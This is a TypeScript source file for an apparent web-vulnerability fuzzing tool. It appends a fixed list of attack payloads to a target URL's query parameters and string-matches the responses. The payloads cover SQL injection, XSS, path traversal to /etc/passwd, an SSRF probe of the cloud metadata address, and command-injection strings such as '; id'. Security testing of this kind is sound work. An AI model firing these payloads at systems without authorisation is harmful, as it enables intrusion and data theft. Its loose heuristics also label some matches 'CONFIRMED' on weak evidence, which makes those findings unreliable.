import { Tool, ToolInput, ToolOutput } from '@shared/types/tool';

export const PayloadFuzzTool: Tool = {
    name: 'payload_fuzz',
    description: 'Generic fuzzer that tests endpoints with a broad set of attack payloads.',

    async run(input: ToolInput, signal?: AbortSignal): Promise<ToolOutput> {
        const { target, contextParams } = input;
        const base = contextParams?.baseUrl || target;
        const payloads = [
            // SQLi
            "' OR '1'='1",
            "admin'--",
            "1' SLEEP(5)--",
            // XSS
            "<script>alert(1)</script>",
            "\"><svg/onload=alert(1)>",
            "javascript:alert(1)",
            // Path Traversal
            "../../../../etc/passwd",
            "C:\\Windows\\win.ini",
            // SSRF / Redirect
            "http://169.254.169.254/latest/meta-data/",
            "//google.com/%2f..",
            // Command Injection
            "; id",
            "| whoami"
        ];

        let requestsMade = 0;
        const findings: string[] = [];
        let vulnerabilityData: any = { tests: [] };
        let successfulRequests = 0;
        for (const payload of payloads) {
            try {
                requestsMade++;
                const url = new URL(target, base);
                // Standard test on 'id' or common param, but better: test the whole URL
                url.searchParams.append('q', payload);
                url.searchParams.append('id', payload);

                const response = await fetch(url.toString(), { signal });
                successfulRequests++;
                const text = await response.text();

                // 1. Reflection Analysis (XSS indicator)
                if (text.includes(payload)) {
                    findings.push(`Input reflection detected: ${payload} is rendered in response. Potential XSS.`);
                }

                // 2. String Matchers
                if (text.includes('root:x:0:0:')) {
                    findings.push(`CONFIRMED: Path Traversal (LFI) via ${payload}`);
                }
                if (text.includes('ami-id') || text.includes('instance-id')) {
                    findings.push(`CONFIRMED: SSRF via ${payload}`);
                }
                if (response.status === 500 && (text.toLowerCase().includes('sql') || text.toLowerCase().includes('syntax'))) {
                    findings.push(`CONFIRMED: SQL Injection via ${payload}`);
                }

                vulnerabilityData.tests.push({ payload, status: response.status, reflected: text.includes(payload) });
            } catch (e) {
                // Ignore individual request failures
            }
        }

        if (successfulRequests === 0 && payloads.length > 0) {
            return {
                findings: [],
                requestsMade,
                error: `All ${payloads.length} fuzzing requests failed. Target might be down or blocking requests.`,
                data: { status: 'failed', requestsMade }
            };
        }

        if (findings.length > 0) {
            return { findings, requestsMade, data: { status: 'vulnerable', findings } };
        }

        return { findings: [], requestsMade, data: { status: 'clean' } };
    }
};
